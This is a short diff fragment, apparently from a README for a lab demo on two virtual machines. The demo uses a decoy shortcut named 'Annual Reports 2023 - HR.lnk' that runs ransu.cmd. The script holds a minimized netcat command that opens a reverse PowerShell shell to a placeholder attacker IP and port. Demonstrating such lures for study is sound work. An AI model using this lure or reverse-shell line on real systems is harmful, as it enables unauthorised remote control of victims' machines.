@@ -3,7 +3,7 @@ Demo was made using 2 virtual machines:
 - Windows 10
 
 Structure:   
-Annual Reports 2023 - HR.lnk -> Linked to ransu.cmd
+Annual Reports 2023 - HR.lnk -> Linked to ransu.cmd   
 ransu.cmd:   
 ```bash
 start /min nc64.exe <attacker ip> <attacker port> -e powershell
